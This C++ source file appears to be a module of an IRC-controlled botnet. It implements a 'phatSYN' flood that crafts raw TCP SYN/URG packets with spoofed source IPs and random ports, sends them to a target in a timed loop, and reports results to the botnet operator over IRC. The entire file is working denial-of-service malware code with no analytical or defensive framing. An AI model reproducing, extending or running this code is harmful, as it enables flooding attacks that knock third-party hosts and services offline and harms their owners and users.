#include "main.h"
#include "mainctrl.h"

inline unsigned long spoofip (unsigned long t_target)
{
	struct in_addr hax0r;
	char convi[16];
	int a, b, c, d;
	hax0r.s_addr = htonl (t_target);
	sscanf (inet_ntoa (hax0r), "%d.%d.%d.%d", &a, &b, &c, &d);
	a = brandom(1,254);
	b = brandom(1,254);
	sprintf (convi, "%d.%d.%d.%d", d, c, b, a);
	return inet_addr (convi);
}

long PhatSynFlood(char *target, int port, int len, int delay);

CDDOSPhatSynFlood::CDDOSPhatSynFlood() { m_szType="CDDOSPhatSynFlood"; m_sDDOSName.Assign("phatSYN"); }

void CDDOSPhatSynFlood::StartDDOS()
{	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: flooding %s port %u for %u seconds, %d ms delay.", m_sDDOSName.CStr(), m_sHost.CStr(), m_iPort, m_iTime, m_iDelay);
	CString sReply; sReply.Format("%s: %s:%d [%i]", m_sDDOSName.CStr(), m_sHost.CStr(), m_iPort, PhatSynFlood(m_sHost.Str(), m_iPort, m_iTime, m_iDelay)/1024/m_iTime);
	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s", sReply.CStr()); }

long SendPhatSyn(unsigned long TargetIP, unsigned short TargetPort, int len, int delay)
{	
  int rawsock=0;
#ifdef _WIN32
  BOOL flag=TRUE;
#else
  bool flag=true;
#endif // _WIN32
  static char synb[8192];
  unsigned long lTimerCount=0;
  sockaddr_in sin;

#ifdef _WIN32
  rawsock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED);
#else
  rawsock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
#endif
  setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag));
  if(rawsock==INVALID_SOCKET) return false;
  
  struct iph *ih = (struct iph *) synb;
  TCPHEADER *th = (TCPHEADER *) (synb + sizeof (struct iph));

  ih->version = 4;
  ih->ihl = 5;
  ih->tos = 0x00;
  ih->tot_len = sizeof (ih) + sizeof (th);
  ih->frag_off = 0;
  ih->protocol = IPPROTO_TCP;
  ih->check = 0;
  ih->daddr = TargetIP;
  th->th_flag = SYN | URG;
  th->th_lenres=(sizeof(th)/4<<4|0);
  th->th_sum = 0;

  lTimerCount=GetTickCount();
  
  for (;;)
  {
  ih->id = htons (brandom (1024, 65535));
  ih->ttl = brandom (200, 255);
  ih->saddr = spoofip (TargetIP);
  th->th_sport = htons (brandom (0, 65535));
  
  if (TargetPort == 0)
  { th->th_dport = htons (brandom (0, 65535)); }
  else { th->th_dport = htons(TargetPort); }

  th->th_seq = htonl (brandom (0, 65535) + (brandom (0, 65535) << 8));
  th->th_ack = htons (brandom (0, 65535));
  th->th_win = htons (brandom (0, 65535));
  th->th_urp = htons (brandom (0, 65535));
  th->th_sum = checksum ((unsigned short *) synb, (sizeof (struct iph) + sizeof (TCPHEADER) + 1) & ~1);
  ih->check = checksum ((unsigned short *) synb, (4 * ih->ihl + sizeof (TCPHEADER) + 1) & ~1);
  
  sin.sin_family = AF_INET;
  sin.sin_port = th->th_dport;
  sin.sin_addr.s_addr = ih->daddr;
  
  sendto (rawsock, synb, 4 * ih->ihl + sizeof (TCPHEADER), 0, (struct sockaddr *) &sin, sizeof (sin));
  
  if((GetTickCount()-lTimerCount)/1000>len) break;
  Sleep(delay);
  }	
return 0; }

long PhatSynFlood(char *target, int port, int len, int delay)
{	unsigned long TargetIP;
	CDNS cDNS; TargetIP=cDNS.ResolveAddress(target);
	return SendPhatSyn(TargetIP, port, len, delay); }
